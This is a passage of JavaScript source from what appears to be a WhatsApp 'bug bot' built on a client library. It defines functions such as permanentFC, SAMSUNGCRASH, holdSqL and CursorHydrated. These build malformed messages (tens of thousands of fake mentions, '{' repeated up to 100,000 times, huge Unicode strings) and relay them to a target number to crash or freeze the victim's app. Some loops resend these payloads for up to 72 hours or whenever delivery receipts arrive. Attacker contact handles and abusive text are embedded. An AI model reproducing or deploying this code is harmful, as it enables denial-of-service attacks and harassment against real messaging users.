},\"additional_note\":\"\"}",
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: "status@broadcast"
          }
        }
      }
    }
  }, {});
  
  await XeonBotInc.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}
//==============================================================\\
//Delay Group
async function xdelaygcxtoya(BODY) {   // ← بدّل target بـ m
    const mentionedList = Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`);
    const target = m.chat;  // ← دلوقتي مفيش تعارض

    await XeonBotInc.sendMessage(target, {
        text: "Telegram: @lo_tus_19",
        contextInfo: {
            mentionedJid: mentionedList,
            isGroupMention: true,
            participant: "0@s.whatsapp.net",
            expiration: 1,
            ForwardedAIBotMessageInfo: {
                botName: "Meta Ai",
                botJid: "01096379348@s.whatsapp.net",
                creatorName: "BODY" + "ោ៝".repeat(5000)
            }
        }
    });
}
//My heart was worth it because I was content with you.: @lo_tus_19 ❣️.
async function xeonAndroidInvisible(targetNumber) {
 try {
   let message = {
     ephemeralMessage: {
       message: {
         interactiveMessage: {
           header: {
             title: "Telegram:  13",
             hasMediaAttachment: false,
             locationMessage: {
               degreesLatitude: -999.035,
               degreesLongitude: 922.999999999999,
               name: "Telegram: @lo_tus_19",
               address: "Telegram: @lo_tus_19",
             },
           },
           body: {
             text: "Telegram: @lo_tus_19",
           },
           nativeFlowMessage: {
             messageParamsJson: "{".repeat(10000),
           },
           contextInfo: {
             participant: targetNumber,
             mentionedJid: [
               "0@s.whatsapp.net",
               ...Array.from(
                 {
                   length: 30000,
                 },
                 () =>
                   "1" +
                   Math.floor(Math.random() * 5000000) +
                   "@s.whatsapp.net"
               ),
             ],
           },
         },
       },
     },
   };

   await XeonBotInc.relayMessage(targetNumber, message, {
     messageId: null,
     participant: { jid: targetNumber },
     userJid: targetNumber,
   });
 } catch (err) {
   console.log(err);
 }
}
//==============================================================\\
async function IosNew(Jids) {
await XeonBotInc.relayMessage(Jids, {
					extendedTextMessage: {
						text: "destructor ios - ( yukina Devils  )\n" + "".repeat(250000),
						contextInfo: {
							mentionedJid: "628953008888@s.whatsapp.net", ...Array.from({ length: 15000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
							stanzaId: "1234567890ABCDEF",
                            participant: Jids,
                            conversionDelaySeconds: 45,
							forwardingScore: 99,
							isForwarded: true,
							quotedAd: {
							advertiserName: "bug fucx your mother",
							caption: "\u0000",
							mediaType: "IMAGE",
							jpegThumbnail: null,
							},
							externalAdReply: {
								title: "trash ios new" + "".repeat(100),
								body: "Fail Beta - ( coresix )" + "".repeat(20),
								mediaType: "IMAGE",
								renderLargerThumbnail: true,
								previewType: "IMAGE",
								thumbnail: null,
								sourceType: "message",
								sourceId: "762",
								sourceUrl: "t.me/mulzyapocalypse",
								mediaUrl: "https://t.me/Yukinaaja",
								containsAutoReply: true,
								showAdAttribution: true,
							},
							disappearingMode: {
								initiator: 'INITIATED_BY_ME'
								},
								placeholderKey: {
						remoteJid: "0@s.whatsapp.net",
						fromMe: false,
						id: "0"
					}}}}, {
					participant: {
						jid: Jids
					}});
		};
//==============================================================\\
async function permanentFC(target) {
  
  const tickStatusMap = {};

  async function invisCursorSqL(target) {
  const Node = [
    {
      tag: "bot",
      attrs: {
        biz_bot: "1"
      }
    }
  ];

  const msg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16)
          })
        },
        interactiveMessage: {
          header: {
            title: "",
            hasMediaAttachment: false,
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "NzsD1qquqQAeJ3MecYvGXETNvqxgrGH2LaxD8ALpYVk=",
              fileLength: "999999",
              height: 1080,
              width: 1080,
              mediaKey: "H/rCyN5jn7ZFFS4zMtPc1yhkT7yyenEAkjP0JLTLDY8=",
              fileEncSha256: "RLs/w++G7Ria6t+hvfOI1y4Jr9FDCuVJ6pm9U3A2eSM=",
              directPath: "/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1750124469",
              jpegThumbnail: null,
              contextInfo: {
                mentionedJid: [target],
                participant: target,
                remoteJid: target,
                stanzaId: XeonBotInc.generateMessageTag(),
                expiration: 9999,
                ephemeralSettingTimestamp: 9999,
                entryPointConversionSource: "WhatsApp.com",
                entryPointConversionApp: "WhatsApp",
                entryPointConversionDelaySeconds: 9999,
                disappearingMode: {
                  initiator: "INITIATED_BY_OTHER",
                  trigger: "ACCOUNT_SETTING"
                },
                quotedMessage: {
                    viewOnceMessage: {
                      message: {
                        interactiveResponseMessage: {
                          body: {
                            text: "Sent",
                            format: "DEFAULT"
                           },
                           nativeFlowResponseMessage: {
                             name: "galaxy_message",
                             paramsJson: JSON.stringify({
                               header: "🩸",
                               body: "🩸",
                               flow_action: "navigate",
                               flow_action_payload: { screen: "FORM_SCREEN" },
                               flow_cta: "Grattler",
                               flow_id: "1169834181134583",
                               flow_message_version: "3",
                               flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
                            }),
                          version: 3
                        }
                      }
                    }
                  }
                },
              },
              scansSidecar: "E+3OE79eq5V2U9PnBnRtEIU64I4DHfPUi7nI/EjJK7aMf7ipheidYQ==",
              scanLengths: [2071, 6199, 1634, 1983],
              midQualityFileSha256: "S13u6RMmx2gKWKZJlNRLiLG6yQEU13oce7FWQwNFnJ0="
            }
          },
          body: {
            text: ""
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(100000)
          }
        }
      }
    }
  }, {});

  await XeonBotInc.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      },
      ...Node
    ]
  });
}
  
  async function cursorSqL(target) {

    const Node = [
      {
        tag: "bot",
        attrs: {
          biz_bot: "1"
        }
      }
    ];

    const msg = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
            messageSecret: crypto.randomBytes(32),
            supportPayload: JSON.stringify({
              version: 2,
              is_ai_message: true,
              should_show_system_message: true,
              ticket_id: crypto.randomBytes(16)
            })
          },
          interactiveMessage: {
            header: {
              title: "",
              hasMediaAttachment: false,
              imageMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0&mms3=true",
                mimetype: "image/jpeg",
                fileSha256: "NzsD1qquqQAeJ3MecYvGXETNvqxgrGH2LaxD8ALpYVk=",
                fileLength: "999999",
                height: 1080,
                width: 1080,
                mediaKey: "H/rCyN5jn7ZFFS4zMtPc1yhkT7yyenEAkjP0JLTLDY8=",
                fileEncSha256: "RLs/w++G7Ria6t+hvfOI1y4Jr9FDCuVJ6pm9U3A2eSM=",
                directPath: "/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1750124469",
                jpegThumbnail: null,
                contextInfo: {
                  mentionedJid: [target],
                  participant: target,
                  remoteJid: target,
                  stanzaId: XeonBotInc.generateMessageTag(),
                  expiration: 9999,
                  ephemeralSettingTimestamp: 9999,
                  entryPointConversionSource: "WhatsApp.com",
                  entryPointConversionApp: "WhatsApp",
                  entryPointConversionDelaySeconds: 9999,
                  disappearingMode: {
                    initiator: "INITIATED_BY_OTHER",
                    trigger: "ACCOUNT_SETTING"
                  },
                  quotedMessage: {
                    viewOnceMessage: {
                      message: {
                        interactiveResponseMessage: {
                          body: {
                            text: "Sent",
                            format: "DEFAULT"
                           },
                           nativeFlowResponseMessage: {
                             name: "galaxy_message",
                             paramsJson: JSON.stringify({
                               header: "🩸",
                               body: "🩸",
                               flow_action: "navigate",
                               flow_action_payload: { screen: "FORM_SCREEN" },
                               flow_cta: "Grattler",
                               flow_id: "1169834181134583",
                               flow_message_version: "3",
                               flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
                               }),
                             version: 3
                           }
                         }
                       }
                     }
                   },
                 },
                scansSidecar: "E+3OE79eq5V2U9PnBnRtEIU64I4DHfPUi7nI/EjJK7aMf7ipheidYQ==",
                scanLengths: [2071, 6199, 1634, 1983],
                midQualityFileSha256: "S13u6RMmx2gKWKZJlNRLiLG6yQEU13oce7FWQwNFnJ0="
              }
            },
            body: {
              text: ""
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(100 * 1000)
            }
          }
        }
      }
    }, {});

    await XeonBotInc.relayMessage(target, msg.message, {
      participant: { jid: target },
      additionalNodes: Node,
      messageId: msg.key.id
    });

    console.log(`succes send to ${target}`);
  };
  
  for (let i = 0; i < 10; i++) {
  await cursorSqL(target);
  await invisCursorSqL(target);
  };
  await sleep(5000)

  XeonBotInc.ev.on("message-status-update", async (update) => {
    const { key, status } = update;
    const jid = key.remoteJid;

    if (!jid || key.fromMe === false || jid !== target) return;

    tickStatusMap[jid] = status;

  for (let i = 0; i < 5; i++) {
    if (status === 2) {
      console.log(`${jid} c2, it's time to resent`);
        await cursorSqL(target);
        await cursorSqL(target);
        await cursorSqL(target);
        await invisCursorSqL(target);
        await invisCursorSqL(target);
        await invisCursorSqL(target);
        await sleep(10000)
    }
  }
  });

  await cursorSqL(target);
  await invisCursorSqL(target);
}

//==============================================================\\
async function holdSqL(target) {

    async function holdbug(target) {
        await XeonBotInc.relayMessage(
            "status@broadcast",
            {
                extendedTextMessage: {
                    text: `${`${"\u0000"}`}`,
                    contextInfo: {
                        mentionedJid: [
                            "696969696969@s.whatsapp.net",
                            ...Array.from(
                                { length: 40000 },
                                () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                            )
                        ],
                        quotedMessage: {
                            nativeFlowMessage: {
                                messageParamsJson: "{".repeat(100000)
                            }
                        }
                    }
                }
            },
            {
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: {
                                            jid: target
                                        },
                                        content: undefined
                                    }
                                ]
                            }
                        ]
                    }
                ]
            }
        );
    }

    const totalDurationMs = 72 * 60 * 60 * 1000;
    const startTime = Date.now();
    let count = 0;

    while (Date.now() - startTime < totalDurationMs) {
        try {
            if (count < 1000) {
                await holdbug(target);
                console.log(chalk.yellow(`process send bug to ${count + 1}/1000 > ${target}`));
                count++;
            } else {
                console.log(chalk.green(`success send 1000 bugs to${target}`));
                count = 0;
                console.log(chalk.red("next send 1000 bugs"));
            }
            await new Promise(resolve => setTimeout(resolve, 100));
        } catch (error) {
            console.error(`error : ${error.message}`);
            await new Promise(resolve => setTimeout(resolve, 100));
        }
    }

    console.log(`sucessed bug after 3 days: ${count}`);
}
//==============================================================\\
async function invisSqL(isTarget) {
  const Node = [
    {
      tag: "bot",
      attrs: {
        biz_bot: "1"
      }
    }
  ];

  const msg = generateWAMessageFromContent(isTarget, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16)
          })
        },
        interactiveMessage: {
          header: {
            title: "Telegram: @lo_tus_19",
            hasMediaAttachment: false,
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "NzsD1qquqQAeJ3MecYvGXETNvqxgrGH2LaxD8ALpYVk=",
              fileLength: "11887",
              height: 1080,
              width: 1080,
              mediaKey: "H/rCyN5jn7ZFFS4zMtPc1yhkT7yyenEAkjP0JLTLDY8=",
              fileEncSha256: "RLs/w++G7Ria6t+hvfOI1y4Jr9FDCuVJ6pm9U3A2eSM=",
              directPath: "/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1750124469",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEAAwEBAAAAAAAAAAAAAAAAAQMEBQYBAQEBAQAAAAAAAAAAAAAAAAACAQP/2gAMAwEAAhADEAAAAPMgAAAAAb8F9Kd12C9pHLAAHTwWUaubbqoQAA3zgHWjlSaMswAAAAAAf//EACcQAAIBBAECBQUAAAAAAAAAAAECAwAREhMxBCAQFCJRgiEwQEFS/9oACAEBAAE/APxfKpJBsia7DkVY3tR6VI4M5Wsx4HfBM8TgrRWPPZj9ebVPK8r3bvghSGPdL8RXmG251PCkse6L5DujieU2QU6TcMeB4HZGLXIB7uiZV3Fv5qExvuNremjrLmPBba6VEMkQIGOHqrq1VZbKBj+u0EigSODWR96yb3NEk8n7n//EABwRAAEEAwEAAAAAAAAAAAAAAAEAAhEhEiAwMf/aAAgBAgEBPwDZsTaczAXc+aNMWsyZBvr/AP/EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8AT//Z",
              contextInfo: {
                mentionedJid: [isTarget],
                participant: isTarget,
                remoteJid: isTarget,
                expiration: 9741,
                ephemeralSettingTimestamp: 9741,
                entryPointConversionSource: "WhatsApp.com",
                entryPointConversionApp: "WhatsApp",
                entryPointConversionDelaySeconds: 9742,
                disappearingMode: {
                  initiator: "INITIATED_BY_OTHER",
                  trigger: "ACCOUNT_SETTING"
                }
              },
              scansSidecar: "E+3OE79eq5V2U9PnBnRtEIU64I4DHfPUi7nI/EjJK7aMf7ipheidYQ==",
              scanLengths: [2071, 6199, 1634, 1983],
              midQualityFileSha256: "S13u6RMmx2gKWKZJlNRLiLG6yQEU13oce7FWQwNFnJ0="
            }
          },
          body: {
            text: "Telegram: @lo_tus_19"
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000)
          }
        }
      }
    }
  }, {});

  await XeonBotInc.relayMessage(isTarget, msg.message, {
    participant: { jid: isTarget },
    additionalNodes: Node,
    messageId: msg.key.id
  });
}
//==============================================================\\
async function CursorHydrated(target) {
  try {
    const node = {
      key: {
        remoteJid: target,
        fromMe: true,
        id: "ABCDEF1234567890"
      },
      message: {
        nativeFlowMessage: {
          messageParamsJson: "{".repeat(100000)
        },
        ephemeralMessage: {
          message: {
            templateMessage: {
              hydratedTemplate: {
                hydratedContentText: "ᬼ".repeat(55555),
                hydratedFooterText: "📜 • 𝐑𝐀𝐋𝐃𝐙𝐙 𝐌𝐄𝐒𝐒𝐀𝐆𝐄",
                hydratedButtons: [
                  {
                    quickReplyButton: {
                      displayText: 'ᬼ'.repeat(10000),
                      id: '{'.repeat(10000)
                    }
                  },
                  {
                    urlButton: {
                      displayText: 'ᬼ'.repeat(7000),
                      url: 'https://wa.me/status?text=' + '{'.repeat(10000)
                    }
                  },
                  {
                    callButton: {
                      displayText: 'ᬼ'.repeat(2000),
                      phoneNumber: '+1404' + '404'.repeat(100)
                    }
                  }
                ]
              }
            }
          },
          contextInfo: {
            mentionedJid: [
              target,
              ...Array.from({ length: 40000 }, () =>
                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
              )
            ],
            stanzaId: XeonBotInc.generateMessageTag(),
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: JSON.stringify({
                        header: "🩸",
                        body: "🩸",
                        flow_action: "navigate",
                        flow_action_payload: { screen: "FORM_SCREEN" },
                        flow_cta: "Grattler",
                        flow_id: "1169834181134583",
                        flow_message_version: "3",
                        flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
                      }),
                      version: 3
                    }
                  }
                }
              }
            }
          }
        }
      }
    };

    await XeonBotInc.relayMessage(target, node.message, { messageId: node.key.id });
    console.log(`success send bugs to ${target}`);
  } catch (error) {
    console.error(`error: ${error}`);
  }
}
//==============================================================\\
const { xeonKingIos } = require('./69/xKingIos.js');
async function xeonSpamIos(target){
	const msg = {
    "viewOnceMessage": {
      "message": {
        "listResponseMessage": {
          "title": "Telegram: @lo_tus_19",
          "listType": "SINGLE_SELECT",
          "singleSelectReply": {},
          "description": xeonKingIos
        }
      }
    }
  };
  const allmsg = generateWAMessageFromContent(target, proto.Message.fromObject(msg), {});
  XeonBotInc.relayMessage(target, allmsg.message, { messageId: allmsg.key.sender });
	}
//==============================================================\\
async function xeonBetaAI(isTarget) {
  const cards = [];

  /*const media = await prepareWAMessageMedia(
  { video: fs.readFileSync('./XeonMedia/Cheems-bot.mp4') },
  { upload: XeonBotInc.waUploadToServer }
);*/

const media = {
      videoMessage: {
        url: 'https://mmg.whatsapp.net/v/t62.7161-24/11902728_707998228510266_7829645663280785822_n.enc?ccb=11-4&oh=01_Q5Aa1wEL8L0ZvwfyQEAl0Ujqn4yUqRi7NLYBclROwMXxB-wiBA&oe=68882423&_nc_sid=5e03e0&mms3=true',
        mimetype: 'video/mp4',
        fileSha256: Buffer.from('j0yv4uuRPfX3ZOfyZ0t8irS7K+MluEOyodghganzbJY=', 'base64'),
        fileLength: '2359888',
        mediaKey: Buffer.from('ld+SoEzJXiVsVakuPuyRWrJfWfvJJYa0CnooCPDdZWo=', 'base64'),
        fileEncSha256: Buffer.from('kibztIx3/O30AIs++tSPOZEIo/S7a6IpBO99d9ycNYk=', 'base64'),
        directPath: '/v/t62.7161-24/11902728_707998228510266_7829645663280785822_n.enc?ccb=11-4&oh=01_Q5Aa1wEL8L0ZvwfyQEAl0Ujqn4yUqRi7NLYBclROwMXxB-wiBA&oe=68882423&_nc_sid=5e03e0',
        mediaKeyTimestamp: '1751161073',
        jpegThumbnail: Buffer.from(
          '/9j//gAQTGF2YzYxLjE5LjEwMQD/2wBDAAgGBgcGBwgICAgICAkJCQoKCgkJCQkKCgoKCgoMDAwKCgoKCgoKDAwMDA0ODQ0NDA0ODg8PDxISEREVFRUZGR//xABxAAEBAQEBAQAAAAAAAAAAAAAHBgAIBAUBAQEBAQAAAAAAAAAAAAAAAAIAAwEQAAIBAwMDAwQDAQAAAAAAAAECAwUEERIABjEHEyIhFCNiUXFhFYEyEQADAQACAwEAAAAAAAAAAAAAAQIRQTEDcRIh/8AAEQgAGAAgAwEiAAIRAAMRAP/aAAwDAQACEQMRAD8Am+0/bShc1pl7eVKS9V4LkRKLeWONdOgNk6onJP8Au71exHCXzieq+xx73MSg/otbDP7GdmnbfkFdpNtFa0/5a2t1dSedrS1SaXyrGvjXXIjqgIz0w342k3vE63UQJJreoSkhmBkkHkd3C4dw8mA2lceoYGeg2HecN+jSPF9rXUz12fDq/bPtzSsJJe36yuzrGj30BZygLMRHHbvJpABJdgifds65VQ+NWFKt7ilyVA3jTnypOPoLA2QgVzGjNIMAt09m6dNolr2j5J8j57myhZ5B9KaSQskbN6lJRGLEr6SScYLE/jc33N4ZV+P02Go1G7iuPlzLHoQyeiT1SHSrKiJGR0VR/J9ztJt8BqZnf3Tz9uea8a4/S7izrK1PyG6M8T2QTThogh1ZkU5BGQCCN2q91+BxRXSRPyKM3WjW5jifTolEg8atNoXJGCAMEEjG+fN7fQj7F3T4VC10EueQiO4gjjANvA0kbJMJWcEz6DqwFwU/59jnch3F5rxuvUuKzo39ozm7W4la+VAoCxsuIyJXxktnSFA2Y724j//Z',
          'base64'
        )
      }
    };

  const header = {
    videoMessage: media.videoMessage,
    hasMediaAttachment: false,
    contextInfo: {
      forwardingScore: 666,
      isForwarded: true,
      stanzaId: "Telegram: @lo_tus_19" + Date.now(),
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      quotedMessage: {
        extendedTextMessage: {
          text: "Telegram: @lo_tus_19",
          contextInfo: {
            mentionedJid: ["01096379348@s.whatsapp.net"],
            externalAdReply: {
              title: "Telegram: @lo_tus_19",
              body: "Telegram: @lo_tus_19",
              thumbnailUrl: "",
              mediaType: 1,
              sourceUrl: "https://tama.example.com",
              showAdAttribution: false // trigger 1
            }
          }
        }
      }
    }
  };

  for (let r = 0; r < 15; r++) {
    cards.push({
      header,
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(10000) // trigger 2
      }
    });
  }

  const msg = generateWAMessageFromContent(
    isTarget,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "Telegram: @lo_tus_19"
            },
            carouselMessage: {
              cards,
              messageVersion: 1
            },
            contextInfo: {
              businessMessageForwardInfo: {
                businessOwnerJid: "01096379348@s.whatsapp.net"
              },
              stanzaId: "Telegram: @lo_tus_19" + "Telegram: @lo_tus_19" + Math.floor(Math.random() * 99999), // trigger 3
              forwardingScore: 100,
              isForwarded: true,
              mentionedJid: ["01096379348@s.whatsapp.net"], // trigger 4
              externalAdReply: {
                title: "Telegram: @lo_tus_19",
                body: "",
                thumbnailUrl: "https://example.com/",
                mediaType: 1,
                mediaUrl: "",
                sourceUrl: "https://example.com",
                showAdAttribution: false
              }
            }
          }
        }
      }
    },
    {}
  );

  await XeonBotInc.relayMessage(isTarget, msg.message, {
    participant: { jid: isTarget },
    messageId: msg.key.id
  });
}
//==============================================================\\
async function SAMSUNGCRASH(target) {
XeonBotInc.relayMessage(target, {
viewOnceMessage: {
message: {
interactiveMessage: {
    header: {
        hasMediaAttachment: false,
        title: "ꦾ".repeat(60000),
    },
    body: {
        text: ""
    },
    nativeFlowMessage: {
        messageParamsJson: "{".repeat(50000),
    }
}
}
}
},{})

XeonBotInc.relayMessage(target, {
viewOnceMessage: {
message: {
buttonsMessage: {
    text: "ꦾ".repeat(60000),
    contentText: "null",
    buttons: [
    {
        buttonId: "{".repeat(10000),
        buttonText: {
          displayText: "\u0000".repeat(9999)
        },
        type: "NATIVE_FLOW",
        nativeFlowInfo: {
            name: "cta_url",
            paramsJson: "{".repeat(50000),
        },
    }
    ],
    headerType: "TEXT"
}
}}
},{})
}
//==============================================================\\
async function guBeta3(isTarget) {

const mentionedList = [
    "01096379348@s.whatsapp.net",
    ...Array.from({ length: 40000 }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
  ];

  await sleep(10);
  let push = [];

  for (let i = 0; i < 10; i++) {
    push.push({
      body: proto.Message.InteractiveMessage.Body.fromObject({
        text: ''
      }),
      footer: proto.Message.InteractiveMessage.Footer.fromObject({
        text: ''
      }),
      header: proto.Message.InteractiveMessage.Header.fromObject({
        title: '',
        hasMediaAttachment: true,
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/jpeg",
          fileSha256: Buffer.from("dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=", "base64"),
          fileLength: "584",
          height: 1,
          width: 1,
          mediaKey: Buffer.from("LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=", "base64"),
          fileEncSha256: Buffer.from("G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=", "base64"),
          directPath: "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1721344123",
          jpegThumbnail: Buffer.from(
            "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECECFBMTJRUv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
            "base64"
          )
        }
      }),
      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: []
      })
    });
  }

  const msg = generateWAMessageFromContent(
    isTarget,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "gmo   crash   /   @UwU"
            },
            carouselMessage: {
              cards: push,
              messageVersion: 1
            },
            contextInfo: {
              businessMessageForwardInfo: {
                businessOwnerJid: "01096379348@s.whatsapp.net"
              },
              stanzaId: "gmo   crash   /   @UwU" + Math.floor(Math.random() * 99999),
              forwardingScore: 100,
              isForwarded: true,
             mentionedJid: ["01096379348@s.whatsapp.net"],
              externalAdReply: {
                title: "sister crash   /   @UwU",
                body: "",
                thumbnailUrl: "https://example.com/",
                mediaType: 1,
                mediaUrl: "",
                sourceUrl: "https://example.com",
                showAdAttribution: false
              }
            }
          }
        }
      }
    },
    {}
  );

  await XeonBotInc.relayMessage(isTarget, msg.message, {
    participant: { jid: isTarget },
    messageId: msg.key.id
  });
}
//==============================================================\\
async function GhostSqL(target) {

  const mentionedList = [
        "696969696969@s.whatsapp.net",
        "phynx@agency.whatsapp.biz",
        ...Array.from({ length: 35000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];
    
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16)
          })
        },
        interactiveMessage: {
          body: { 
            text: '' 
          },
          footer: { 
            text: '' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: '',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                    fileLength: Math.floor(99.99 * 1073741824).toString(),
                    height: 999,
                    width: 999,
                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749172037",
                    jpegThumbnail: null,
                    scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                    scanLengths: [8596, 155493],
                    annotations: [
                        {
                           embeddedContent: {
                             embeddedMusic: {
                               musicContentMediaId: "1",
                                 songId: "peler",
                                 author: ".RaldzzXyz",
                                 title: "PhynxAgency",
